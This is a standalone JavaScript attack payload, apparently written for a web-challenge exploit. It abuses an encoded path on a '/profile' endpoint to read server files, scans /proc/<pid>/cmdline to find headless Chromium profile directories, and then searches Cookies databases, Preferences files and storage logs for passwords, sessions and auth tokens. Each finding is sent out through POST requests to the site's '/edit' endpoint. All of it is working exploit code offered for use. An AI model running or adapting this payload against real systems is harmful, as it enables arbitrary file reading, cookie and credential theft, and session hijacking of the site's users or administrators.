(async()=>{
if(window.__codexRun0615ah)return;
window.__codexRun0615ah=1;

const post=t=>fetch('/edit',{method:'POST',keepalive:true,headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'title=csrf&content='+encodeURIComponent(String(t).replace(/[^A-Za-z0-9 !.:_\\/-]/g,' '))});
const read=async p=>{
 try{
  let r=await fetch('/profile'+p+'%3f',{cache:'no-store'});
  return [r.status,await r.text()];
 }catch(e){return [0,'']}
};
const readRange=async(p,o,l=1500)=>{
 try{
  let r=await fetch('/profile'+p+'%3f?offset='+o+'&limit='+l,{cache:'no-store'});
  return [r.status,await r.text()];
 }catch(e){return [0,'']}
};

const dirsFrom=c=>{
 let out=[];
 let s=c.replace(/\x00/g,' ');
 for(let x of s.matchAll(/--user-data-dir=([^ ]+)/g)){
  if(!out.includes(x[1]))out.push(x[1]);
 }
 for(let x of s.matchAll(/\/tmp\/\.?org\.chromium\.Chromium\.scoped[_\.]dir\.[A-Za-z0-9]+/g)){
  if(!out.includes(x[0]))out.push(x[0]);
 }
 return out;
};

const findDirs=async()=>{
 let dirs=[], seen=0;
 let probes=['/proc/self/cmdline','/proc/1/cmdline','/proc/sys/kernel/ns_last_pid','/proc/net/tcp'];
 for(let p of probes){
  let [st,c]=await read(p);
  post('probe '+p+' '+st+' '+c.length+' '+c.slice(0,220));
 }
 let [lst,lastTxt]=await read('/proc/sys/kernel/ns_last_pid');
 let last=parseInt((lastTxt.match(/\d+/)||['8000'])[0],10)||8000;
 last=Math.max(8000,Math.min(last+1000,20000));
 post('pid range '+last);
 for(let base=1;base<last;base+=120){
  let rows=await Promise.all(Array.from({length:120},async(_,i)=>{
   let pid=base+i;
   let [st,c]=await read('/proc/'+pid+'/cmdline');
   if(st!==200)return [];
   let s=c.replace(/\x00/g,' ');
   if((s.includes('chrom')||s.includes('Chrome')||s.includes('driver'))&&seen<8){
    seen++;
    post('cmd '+pid+' '+s.slice(0,240));
   }
   let ds=dirsFrom(c);
   if(ds.length)post('pid '+pid+' dirs '+ds.join(' '));
   return ds;
  }));
  for(let ds of rows){
   for(let d of ds){
    if(!dirs.includes(d)){
     dirs.push(d);
     post('profile '+d);
    }
   }
  }
  if(dirs.length)break;
 }
 return dirs;
};

const preview=async p=>{
 let [st,d]=await read(p);
 post('file '+p+' '+st+' '+d.length+' '+d.slice(0,180));
 return st===200;
};

const scanFile=async p=>{
 for(let off=0;off<4000000;off+=1400){
  let [st,d]=await readRange(p,off);
  if(st!==200){post('scan miss '+p+' '+st);return false}
  if(off===0)post('scan '+p+' '+st+' '+d.length+' '+d.slice(0,120));
  if(!d.replace(/\./g,'').length)break;
  let keys=['admin-app','Automad','csrf','localhost','auth','session','Name:','Password:'];
  let hits=keys.map(x=>d.indexOf(x)).filter(x=>x>=0);
  if(hits.length){
   let i=Math.max(0,Math.min(...hits)-70);
   post('hit '+p+' '+off+' '+d.slice(i,Math.min(d.length,i+420)));
   return true;
  }
 }
 return false;
};

post('profile scan 0615ah');
let dirs=await findDirs();
if(!dirs.length){post('profile none');return}

for(let dir of dirs){
 await preview(dir+'/DevToolsActivePort');
 await preview(dir+'/Local State');
 await preview(dir+'/Default/Preferences');
 await preview(dir+'/Default/Secure Preferences');
 let files=[
  '/Default/Network/Cookies',
  '/Default/Cookies',
  '/Network/Cookies',
  '/Cookies',
  '/Default/Session Storage/LOG',
  '/Default/Local Storage/leveldb/LOG'
 ];
 for(let f of files){
  if(await scanFile(dir+f))return;
 }
}
post('profile scan none');
})();
